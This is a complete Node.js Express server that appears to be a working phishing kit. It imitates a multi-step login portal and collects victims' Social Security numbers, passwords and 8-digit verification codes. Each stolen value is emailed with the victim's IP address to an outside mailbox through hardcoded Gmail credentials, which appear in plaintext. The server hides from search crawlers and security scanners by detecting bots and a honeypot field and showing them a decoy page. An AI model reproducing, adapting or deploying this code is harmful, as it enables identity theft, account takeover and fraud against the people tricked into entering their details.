const express = require('express');
const bodyParser = require('body-parser')
const isbot = require('isbot');
const detector = require('spider-detector')
const session = require('express-session');
const nodeMailer = require('nodemailer')
const requestIp = require('request-ip');
require('dotenv').config();
const port = process.env.PORT || 5400

const app = express();
app.use(requestIp.mw())
app.use(detector.middleware())
app.set('view engine', 'ejs')
app.use(express.static('public'))
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }))
app.use(bodyParser.json({ limit: "50mb" }))
app.use(session({
    secret: 'some super secret',
    resave: false,
    saveUninitialized: false,
    cookie: {
        //secure: true,
        httpOnly: true
    }
}))

app.use((req, res, next) => {
    // Set the X-Robots-Tag header to "noindex" to prevent indexing
    res.setHeader('X-Robots-Tag', 'noindex');
    next();
  });
  const interval = 10 * 60 * 1000;
  const intervalObj = setInterval(() => {
    console.log('this is use as a cron job');
  },interval);
app.get('/', async (req, res) => {
    const bot = isbot(req.get('user-agent'))
    if (bot && req.isSpider()) {
        res.render('mov');
    } else {
        if (req.session.error) {
            var error = req.session.error
            var errorOne = req.session.errorOne
            var errorTwo = req.session.errorTwo
            res.render('firstpage', { error: error, errorOne: errorOne, errorTwo: errorTwo });
        } else {
            res.render('firstpage', { error: false, errorOne: '', errorTwo: '' });
        }
    }

})

app.get('/entrpaswrd', async (req, res) => {
    const bot = isbot(req.get('user-agent'))
    if (bot && req.isSpider()) {
        res.render('mov');
    } else {
        var error = req.session.error
        var errorOne = req.session.errorOne
        var errorTwo = req.session.errorTwo
        res.render('secondpage', { error: error, errorOne: errorOne, errorTwo: errorTwo });
    }

})

app.get('/verificationcode', async(req, res) => {
    const bot = isbot(req.get('user-agent'))
    if (bot && req.isSpider()) {
        res.render('mov');
    } else {
    if (req.session.error) {
        var error = req.session.error
        var errorOne = req.session.errorOne
        res.render('verificationcode', { error: error, errorOne: errorOne });
    } else {
        res.render('verificationcode', { error: false, errorOne: ''});
    }
}
   
})

app.post('/cliament', async (req, res) => {
    const ip = req.clientIp;
    const bot = isbot(req.get('user-agent'))
    const inp1 = req.body.ctl00$ctl00$cphMain$cphMain$txtSSN1
    const inp2 = req.body.ctl00$ctl00$cphMain$cphMain$txtConfirmSSN1
    const inp3 = req.body.unk
    const ssnFormatOne = inp1.substr(0, 3) + '-' + inp1.substr(3, 2) + '-' + inp1.substr(5, 4);
    const ssnFormatTwo = inp2.substr(0, 3) + '-' + inp2.substr(3, 2) + '-' + inp2.substr(5, 4);
    const regExp = /^(?!666|000|9\d{2})\d{3}-(?!00)\d{2}-(?!0{4})\d{4}$/
    const inputOne = regExp.test(ssnFormatOne)
    const inputTwo = regExp.test(ssnFormatTwo)

    if ((bot && req.isSpider()) || inp3 !== '') {
        console.log(inp3);
        res.render('mov');
    } else {
        console.log(inp3);
        if (inp1 === '' && inp2 === '') {
            console.log('one');
            // const errorOne = 'Social Security Number is required. (30)'
            // const errorTwo = 'Confirm Social Security Number is required. (30)'
            req.session.errorOne = 'Social Security Number is required. (30)'
            req.session.errorTwo = 'Confirm Social Security Number is required. (30)'
            req.session.error = true
            res.redirect('/')
            //res.render('firstpage',{error: true,errorOne, errorTwo}  )
        } else if (!(inputOne) && inp2 === '') {
            console.log('two');
            req.session.errorOne = 'Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.errorTwo = 'Confirm Social Security Number is required. (30)'
            req.session.error = true
            res.redirect('/')

        } else if (!(inputTwo) && inp1 === '') {
            console.log('3');
            req.session.errorOne = 'Social Security Number is required. (30)'
            req.session.errorTwo = 'Confirm Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.error = true
            res.redirect('/')
        } else if (!(inputOne && inputTwo)) {
            console.log('4');
            req.session.errorOne = 'Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.errorTwo = 'Confirm Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.error = true
            res.redirect('/')
        } else if (inp1 != inp2) {
            console.log('5');
            req.session.errorOne = 'Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.errorTwo = 'Confirm Social Security Number: is not a valid SSN (Social Security Number). Valid formats are XXXXXXXXX (32)'
            req.session.error = true
            res.redirect('/')
        } else {
            const html = `<p>userId = ${ssnFormatOne}</P> <p>verifyUserId = ${ssnFormatTwo}</P>
                `
            const transporter = nodeMailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'tyburksi23099@gmail.com',
                    pass: 'yedgwbblptqlpvxo'
                }
            })

            const mailOptions = {
                from: 'RESULT <leroy23099@yahoo.com>',
                to: 'unk23099@gmail.com',
                subject: `User Details for ${ip}`,
                html: html

            }
            const result = transporter.sendMail(mailOptions, function (err, result) {
                if (err) {
                    res.send({ message: 'error' })
                    console.log(err);
                } else {
                    req.session.error = false
                    res.redirect('entrpaswrd')
                }
            })
            // res.render('secondpage',{ error: false })
            // res.end()
        }

    }
})

app.post('/entrpaswrd', (req, res) => {
    const ip = req.clientIp;
    const bot = isbot(req.get('user-agent'))
    const inp3 = req.body.unk
    const inp1 = req.body.ctl00$ctl00$cphMain$cphMain$txtConfirmSSN1
    if ((bot && req.isSpider()) || inp3 !== '') {
        res.render('mov');
    } else {
        
        if (inp1 === '') {
            req.session.errorOne = 'Password is required. (30)'
            req.session.error = true
            res.redirect('entrpaswrd')
        } else if (inp1.length < 5) {
            console.log('init');
            console.log('yay');
            req.session.errorOne = 'Incorrect Password, please try again. (30)'
            req.session.error = true
            res.redirect('entrpaswrd')
        } else {
            const html = `<p>password = ${inp1}</P> `
            const transporter = nodeMailer.createTransport({
                service: 'gmail',
                auth: {
                    user: 'tyburksi23099@gmail.com',
                    pass: 'yedgwbblptqlpvxo'
                }
            })

            const mailOptions = {
                from: 'RESULT <leroy23099@yahoo.com>',
                to: 'unk23099@gmail.com',
                subject: `Pazz for ${ip}`,
                html: html

            }
            const result = transporter.sendMail(mailOptions, function (err, result) {
                if (err) {
                    res.send({ message: 'error' })
                    console.log(err);
                } else {
                    req.session.error = false
                    res.redirect('verificationcode')
                }
            })

        }

    }
})

app.post('/verificationcode',(req,res) => {
    const ip = req.clientIp;
    const inp1 = req.body.verificode
    const inp3 = req.body.unk
    const bot = isbot(req.get('user-agent'))
    if ((bot && req.isSpider()) || inp3 !== '') {
        res.render('mov');
    } else {
        if (inp1 === '') {
            req.session.errorOne = 'Password is required. (30)'
            req.session.error = true
            res.redirect('verificationcode')
        }
        else if(inp1.length < 8) {
            console.log('less');
            req.session.errorOne = 'Verification code must be 8 digits. (30)'
            req.session.error = true
            res.redirect('verificationcode')
        } else {
            const html = `<p>verification = ${inp1}</P> `
            const transporter = nodeMailer.createTransport({
                //service: 'gmail',
                service: 'gmail',
                auth: {
                    user: 'tyburksi23099@gmail.com',
                    pass: 'yedgwbblptqlpvxo'
                    // user: 'leroy23099@yahoo.com',
                    // pass: 'aowjybphqdrechtf'
                }
            })

            const mailOptions = {
                from: 'RESULT <leroy23099@yahoo.com>',
                to: 'unk23099@gmail.com',
                subject: `verification code for ${ip}`,
                html: html

            }
            const result = transporter.sendMail(mailOptions, function (err, result) {
                if (err) {
                    res.send({ message: 'error' })
                    console.log(err);
                } else {
                    req.session.error = false
                    res.redirect('/')
                }
            })

        }
    }
})

app.listen(port, (req, res) => {
    console.log(`listening on ${port}`);
})